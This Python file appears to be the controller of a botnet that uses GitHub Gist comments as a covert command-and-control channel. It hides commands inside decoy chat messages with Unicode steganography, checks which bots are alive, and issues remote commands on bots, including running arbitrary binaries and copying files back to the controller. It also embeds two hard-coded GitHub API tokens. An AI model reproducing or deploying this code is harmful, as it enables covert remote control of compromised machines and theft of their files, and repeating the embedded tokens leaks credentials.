from simplegist import Simplegist
import random, time, threading, socket
import tqdm, os, urllib
from bs4 import BeautifulSoup as BS
import base64
import pyUnicodeSteganography as usteg
ghGist = Simplegist(username='jirikdan', api_token='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')
GhgistBot = Simplegist(username='TheQfr', api_token='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')
botIsAliveQuestion = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bored :P"]
controllerRandomQuestions = ["What a nice day", "Im gonna watch netflix today", "Well the weather is so nice but im here using gist"]
comments = ghGist.comments().listall(name='secret.txt')
commentsNumber = len(comments)

fileID = 0

def checkAliveBots():
    while True:
        global commentsNumber
        ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveQuestion))
        time.sleep(6)
        currComments = ghGist.comments().listall(name='secret.txt')
        currCommentsNumber = len(currComments)
        
        aliveBots = 0
        if currCommentsNumber != commentsNumber:
            commentsDiff = currCommentsNumber - commentsNumber
            for i in range(0,commentsDiff):
                if currComments[len(currComments)-1 - i] in botIsAliveAnswers:
                    aliveBots += 1
            commentsNumber = currCommentsNumber
        print("There are " + str(aliveBots) + " bots up and running")
        time.sleep(60)

thread2 = threading.Thread(target=checkAliveBots)
thread2.daemon = True
thread2.start()

def deleteAllComments():
    print("Deleting all comments - this might take a while")
    while len(ghGist.comments().listall(name='secret.txt')) != 0:
        url ="https://gist.github.com/jirikdan/8b1ad9484c7acb95f0a72d4c6ece1f06"
        usock = urllib.request.urlopen(url)
        data = usock.read()
        usock.close()
        soup = BS(data, features="html.parser")
        try:
            comment_id = soup.find('form', {'class':'js-comment-update'}).attrs.get("action")
            size = len(comment_id)
            comment_id = comment_id[size-7:]
            ghGist.comments().delete(name='secret.txt', commentid=comment_id)
            GhgistBot.comments().delete(id='8b1ad9484c7acb95f0a72d4c6ece1f06', commentid=comment_id)
        except:
            #print("break")
            #break
            continue
    print("Done")


def reconstruct_from_plain_text(plain_text, file_path,command):
    global fileID
    #print(plain_text)
    file_path = command[5:]
    _, file_ext = os.path.splitext(file_path)
    
    binary_data = base64.b64decode(plain_text.encode('utf-8'))
    with open("copiedFiles/"+str(fileID)+file_path, 'wb') as file:
        file.write(binary_data)
        fileID += 1 
    print("Received file is in copiedFiles/"+str(fileID-1)+file_path)



def receiveBotAnswer(command):
    fakeMessage = random.choice(controllerRandomQuestions)
    sendStr = usteg.encode(fakeMessage, command)
    ghGist.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    beforeCommentsNumber = len(ghGist.comments().listall(name='secret.txt'))
    #wait for bots to make their answer
    time.sleep(5)
    #get the answers
    currComments = ghGist.comments().listall(name='secret.txt')
    afterCommentsNumber = len(currComments)
    diff = afterCommentsNumber - beforeCommentsNumber
    for i in range(0, diff):
        currComment = currComments[len(currComments)-1 - i]
        if command.startswith('execute'):
            print(usteg.decode(currComment))
        if command.startswith('w'):
            print(usteg.decode(currComment))
        if command.startswith('ls'):
            print(usteg.decode(currComment))
        if command.startswith('id'):
            print(usteg.decode(currComment))
        if command.startswith('copy'):
            if (currComment.startswith('No such')):
                print("No such file exists")
            else:
                reconstruct_from_plain_text(usteg.decode(currComment), "copiedFiles/", command)


while True:
    command = input("Type your command or help for help\n")
    if len(ghGist.comments().listall(name='secret.txt')) == 30:
        print("Max commands reached, reseting gist")
        deleteAllComments()
    if command == "HELP" or command == "help":
        print("w - (list of users currently logged in)")
        print("ls <PATH> (list content of specified directory)")
        print("id (if of current user). Example: id")
        print("copy - copies a file from the bot to the controller. The file name is specified. Example copy file.txt")
        print("execute - executes a binary inside the bot given the name of the binary. Example: execute /usr/bin/ps")
        print("reset - delete comments on gist")
    if command.startswith('execute'):
        receiveBotAnswer(command)
    if command.startswith('w'):
        receiveBotAnswer(command)
    if command.startswith('ls'):
        receiveBotAnswer(command)
    if command.startswith('id'):
        receiveBotAnswer(command)
    if command.startswith('copy'):
        receiveBotAnswer(command)  	
    if command.startswith('reset'):
        deleteAllComments()